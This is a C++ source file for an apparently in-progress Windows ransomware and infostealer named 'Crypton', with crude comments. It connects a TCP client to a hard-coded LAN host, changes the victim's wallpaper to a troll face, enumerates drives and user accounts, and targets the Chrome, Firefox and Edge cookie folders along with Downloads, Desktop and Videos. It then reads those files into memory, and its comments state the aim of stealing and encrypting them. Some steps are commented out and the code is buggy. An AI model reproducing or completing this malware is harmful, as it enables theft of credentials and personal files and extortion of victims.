#pragma comment (lib, "Ws2_32.lib")

#include <ws2tcpip.h> 
#include <windows.h>
#include <bitset>
#include <vector>
#include <iostream>
#include <filesystem>
#include <string>
#include "dirent.h"
#include <direct.h >
#include <fstream>
#include <codecvt>
#include <sstream>
#include <iostream>
#include <clocale>
#include <stdio.h>
#include <socketapi.h>
#include <sys/types.h>


#define PORT "8080"
#define DEFAULT_BUFLEN 512
using namespace std;

class ClIENT_SOCKET
{
private:
    std::string port;
    int res;
    SOCKET connect_socket;
public:
    ClIENT_SOCKET(const char* port_numb);
    int client_start();
    int client_recv();
    int send_data();
};

ClIENT_SOCKET::ClIENT_SOCKET(const char* port_numb)
{
    port = port_numb;
    WSADATA wsadata;
    res = WSAStartup(MAKEWORD(2, 2), &wsadata);
    if (res != 0) {
        printf("WSAStartup failed: %d\n", res);
        return;
    }
}
int ClIENT_SOCKET::client_start()
{
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    res = getaddrinfo("192.168.56.1", port.c_str(), &hints, &result);
    if (res != 0) {
        printf("getaddrinfo failed: %d\n", res);
        WSACleanup();
        return 1;
    }
    connect_socket = INVALID_SOCKET;
    ptr = result;

    // Create a SOCKET for connecting to server
    connect_socket= socket(ptr->ai_family, ptr->ai_socktype,
        ptr->ai_protocol);
    if (connect_socket == INVALID_SOCKET) {
        printf("Error at socket(): %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // Connect to server.
    res = connect(connect_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (res == SOCKET_ERROR) {
        closesocket(connect_socket);
        connect_socket = INVALID_SOCKET;
    }

    // Should really try the next address returned by getaddrinfo
    // if the connect call failed
    // But for this simple example we just free the resources
    // returned by getaddrinfo and print an error message

    freeaddrinfo(result);

    if (connect_socket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
}
int ClIENT_SOCKET::send_data()
{
    int recvbuflen = DEFAULT_BUFLEN;

    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];
    // Send an initial buffer
    res = send(connect_socket, sendbuf, (int)strlen(sendbuf), 0);
    if (res == SOCKET_ERROR) {
        printf("send failed: %d\n", WSAGetLastError());
        closesocket(connect_socket);
        WSACleanup();
        return 1;
    }
    printf("Bytes Sent: %ld\n", res);

    // shutdown the connection for sending since no more data will be sent
    // the client can still use the ConnectSocket for receiving data
    res = shutdown(connect_socket, SD_SEND);
    if (res == SOCKET_ERROR) {
        printf("shutdown failed: %d\n", WSAGetLastError());
        closesocket(connect_socket);
        WSACleanup();
        return 1;
    }
    // Receive data until the server closes the connection
    do {
        res = recv(connect_socket, recvbuf, recvbuflen, 0);
        if (res > 0) {
            printf("Bytes received: %d\n", res);
            connect_socket = SOCKET_ERROR;
        }
        else if (res == 0)
            printf("Connection closed\n");
        else
            printf("recv failed: %d\n", WSAGetLastError());
    } while (res > 0 && connect_socket != SOCKET_ERROR);
}

class File 
{
private:
    std::string data;
    std::string path;
    std::string name;
    unsigned int type;
    unsigned int size;
  
    bool set_fpath;
public:

    void open_file()
    {
        path.back() = ' ';

        std::string fn = name;
        if (fn.substr(fn.find_last_of(".") + 1) == "bin" || fn.substr(fn.find_last_of(".") + 1) == "mp4", fn.substr(fn.find_last_of(".") + 1) == ".lock") {
            return;
        }
        ifstream ifs(path.c_str(), ios::in | ios::binary | ios::ate);

        ifstream::pos_type fileSize = ifs.tellg();
        if (fileSize == 0)
            return;

            ifs.seekg(0, ios::beg);

        vector<char> bytes(fileSize);
        ifs.read(&bytes[0], fileSize);
       

        data = data + string(&bytes[0], fileSize);

    }
    void set_path(std::string path_)
    {
        path = path_;
    }
    unsigned int get_type()
    {
        return type;
    }
    unsigned int get_size()
    {
        return size;
    }
    std::string get_name()
    {
        std::vector<std::string> temp;
        std::string word;

        for (int i = 0; i < path.size(); i++)
        {
            if (path[i] == '\\')
            {
                temp.push_back(word);
                word = "";
            }
            else 
            {
                word = word + path[i];
            }
        }
        set_fpath = true;
        name = temp.back();
        return temp.back();
    }
};

const char* WALL_PAPER_NAME = "troll-face.png"; // name of the new wallpaper hehehe

DWORD drives = 100;
char Buffer[100];
int buff_len; // actual amount of drives on the machine
vector<string> drive_names; // names of the drives


std::string WHITE_LIST_PATH; // this is the current white list path and we CANNOT ENCRYPT IT BECAUSE IT CONTAINS THIS FILE

std::string primary_dir; // The directory that has windows installed in it
std::vector<std::string>primary_dirs; // The directories that need to be hit first

std::vector<std::string>users;

unsigned int iter = 0;
unsigned int pos = 0;
std::vector<std::string>unseen_dirs;

std::vector<std::string> take_data; // paths to the data that we want to ehehhe steal
unsigned int r_pos = 0; // a param of parse_folders_Wa

std::vector<std::string> output_; // a param of parse_folders_WA

std::vector<File>file_transfer_array; // file transfer


void change_desktop_wallpaper(char* argv[])
{
    
    char basePath[255] = "";
    char* path_ =  _fullpath(basePath, argv[0], sizeof(basePath));

    std::string pathx = std::string(path_);
    std::string delimeter = "\\";


    size_t pos = 0;
    std::string token;
    std::string new_path;

    while ((pos = pathx.find(delimeter)) != string::npos)
    {
        token = pathx.substr(0, pos);
        new_path = new_path + '\\' + token;

        if (token == "Crypton")
        {
            new_path = new_path + '\\' + WALL_PAPER_NAME;

            break;
        }
        
        pathx.erase(0, pos + delimeter.length());
       
    }
 
    new_path.erase(0, 1);
    
    //conversion of string to wchar_t* because c++ sucks ass
    wstring widestr = wstring(new_path.begin(), new_path.end());
    const wchar_t* path = widestr.c_str();

    int result;
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)path, SPIF_UPDATEINIFILE);
   
   
}

void parse_folders(const char* path)
{

    DIR* dh;
    struct dirent* contents;
    struct stat s;

    
    
    dh = opendir(path);

    if (!dh)
    {
        
        return;
    }
    while ((contents = readdir(dh)) != NULL)
    {
        string name = string(path);
        name = name +"\\" + contents->d_name;

        if (stat(name.c_str(), &s) == 0)
        {
            if (s.st_mode & S_IFDIR)
            {
                if (name.back() != '.') // some weird ass error i decided to hard code cause i got lazy as shit
                {
                    std::cout << name << endl;
                    unseen_dirs.push_back(name);
                    pos++;
                    const char* next_folder = const_cast<LPSTR>(unseen_dirs[pos - 1].c_str());
                    parse_folders(next_folder); // Does some magic shit idk it works tho
                }
              
              
            }
        }

    }
    closedir(dh);


}

void ATTACK_FIXED_DRIVE(const char* path)
{

    DIR* dh;
    struct dirent* contents;

    vector<string>files; 
    vector <string> folders; // primary drive folders

    struct stat s;

    dh = opendir(path);


    if (!dh)
    {
        cout << "The given directory is not found";
        return;
    }
    while ((contents = readdir(dh)) != NULL)
    {
        string name = path;
        name = name + contents->d_name;

        if (stat(name.c_str(), &s) == 0)
        {
            if (s.st_mode & S_IFDIR)
            {
                folders.push_back(name);
                
            }
            else if (s.st_mode & S_IFREG)
            {
                // directly encrypt and read it 
                files.push_back(name);
               
            }
        }

    }
    closedir(dh);

    for (int i = 0; i < folders.size(); i++)
    {
        parse_folders(folders[i].c_str());
        
    }
   

}

std::vector<std::string> GENERATE_ATTACK_PATHS(const char* drive_name, const char* username) // for example for those of you that are brain dead (me including) C:"\" \ 
{
    std::vector<std::string>ret_attack_paths;

    if (users.size() == 0)
    {
        cout << "WTF HOW ARE THEIR 0 USERS ON THIS FUKCING PC" << endl;
    }

    for (int i = 0; i < users.size(); i++)
    {

        std::string name;
        // idk if this is rookie mistake code type of shit but wtf who cares 
      
        // Google chrome cookies
        name = "";
        name = drive_name;
        name = name + "Users\\" + username + "\\" + "AppData\\" + "Local\\" + "Google\\" + "Chrome\\" + "User Data\\" + "Default\\" + "Network";
        ret_attack_paths.push_back(name);
        // Mozilla cookies
        name = "";
        name = drive_name;
        name = name + "Users\\" + username + "\\" + "AppData\\" + "Roaming\\" + "Mozilla\\" + "Firefox\\" + "Profiles";
        ret_attack_paths.push_back(name);
        // Edge Cookies
        name = "";
        name = drive_name;
        name = name + "Users\\" + username + "\\" + "AppData\\" + "Local\\" + "Microsoft\\" + "Edge\\" + "User Data\\" + "Default\\" + "Network";
        ret_attack_paths.push_back(name);

        // Downloads
        name = "";
        name = drive_name;
        name = name + "Users\\" + username + "\\" + "Downloads";
        ret_attack_paths.push_back(name);
        //Desktop
        name = "";
        name = drive_name;
        name = name + "Users\\" + username + "\\" + "Desktop";
        ret_attack_paths.push_back(name);
        // Videos
        name = "";
        name = drive_name;
        name = name + "Users\\" + username + "\\" + "Videos";
        ret_attack_paths.push_back(name);
        
    }

    return ret_attack_paths;

    
}


std::vector<std::string> parse_folder_W(const char* path)
{
    DIR* dh;
    struct dirent* contents;
    struct stat s;

    dh = opendir(path);

    if (!dh)
    {

        return std::vector<std::string>{""};
    }
    while ((contents = readdir(dh)) != NULL)
    {
        string name = string(path);
        name = name + "\\" + contents->d_name;

        if (stat(name.c_str(), &s) == 0)
        {
            if (s.st_mode & S_IFDIR)
            {
                if (name.back() != '.') {
                    
                    output_.push_back(name);

                    r_pos++;
                    const char* next_folder = const_cast<LPSTR>(output_[r_pos-1].c_str());

                    parse_folder_W(next_folder);    
                }
            }
            if (s.st_mode & S_IFREG)
            {
                File f;
                
                f.set_path(name+"\\");
                file_transfer_array.push_back(f);
            }
            
        }

    }
    closedir(dh);
    return output_;
}

bool FIND_PRIMARY_DRIVE(const char* test_path, const char* drive_name)
{
    DIR* dh;
    struct dirent* contents;
    struct stat s;

    dh = opendir(test_path);


    if (!dh)
    {
        return false;
    }
    closedir(dh);

    std::string user_path = std::string(drive_name) + "Users" + "\\";

    
    dh = opendir(user_path.c_str());

    if (!dh)
    {
        return false;
    }

    while ((contents = readdir(dh)) != NULL)
    {
        std::string name = user_path + contents->d_name; +"\\";
        

        if (stat(name.c_str(), &s) == 0)
        {
           
            if (s.st_mode & S_IFDIR)
            {
                string comp = contents->d_name;
                // fucking hard coded everything cause i was lazy as shit
                if (comp != "All Users" && comp!= "Default" && comp != "Default User" && comp != "." && comp != ".." && comp != "Public")
                {
                    users.push_back(contents->d_name);
                }

            }
            
        }
    }
    closedir(dh);

    std::vector<string> attack_paths = GENERATE_ATTACK_PATHS(drive_name, users[0].c_str());
    int relative_pos = 0;
    std::vector<std::string>output;

     for (int i = 0; i < attack_paths.size(); i++)
     {
          
        parse_folder_W(attack_paths[i].c_str()); // parses and collects the main data from the attack paths
    }

    // attack specfic paths containing data such as cookies or uhm idk fucking 

        for (int i = 0; i < file_transfer_array.size(); i++)
        {
            std::cout << "OPENING FILE: "  << file_transfer_array[i].get_name() << std::endl;
            file_transfer_array[i].open_file();

            file_transfer_array[i].get_name();
            
           
        }
        file_transfer_array;
   
    return true;
}

int main(int argc, char* argv[])
{
    ClIENT_SOCKET client_socket(PORT);
    client_socket.client_start();
    client_socket.send_data();


    unseen_dirs.reserve(1400000);
    change_desktop_wallpaper(argv);
    DWORD test = GetLogicalDriveStrings(drives, (LPWSTR)Buffer);

    for (int i = 0; i < 100; i++) {
        if ((int)Buffer[i] != 0) {

            if (Buffer[i] != ':' && Buffer[i] != '\\') {

                string name="";
                name += Buffer[i];
                name += ":";
                name += '\\';

                drive_names.push_back(name);
                buff_len++;
            }
            
        }
    }

    for (int i = 0; i < buff_len; i++)
    {
        string current_drive = drive_names[i];
        switch (GetDriveTypeA(current_drive.c_str()))
        {
        case DRIVE_FIXED: 
        {
            std::string test_path = current_drive + "ProgramData\\Microsoft\\Windows";
          //  if (FIND_PRIMARY_DRIVE(test_path.c_str(), drive_names[i].c_str()))
            //{
              //  cout << current_drive << " :is a primary drive " << endl;
           // }; break;
        }
        case DRIVE_REMOVABLE: cout << "removable" << endl; break;
        case DRIVE_CDROM: cout << "ROM" << endl; break;
        case DRIVE_REMOTE: cout << "network drive" << endl; break;
        }
    }
    // for now we arent indexing but testing it one by one :) 
   // ATTACK_FIXED_DRIVE(drive_names[0].c_str());

}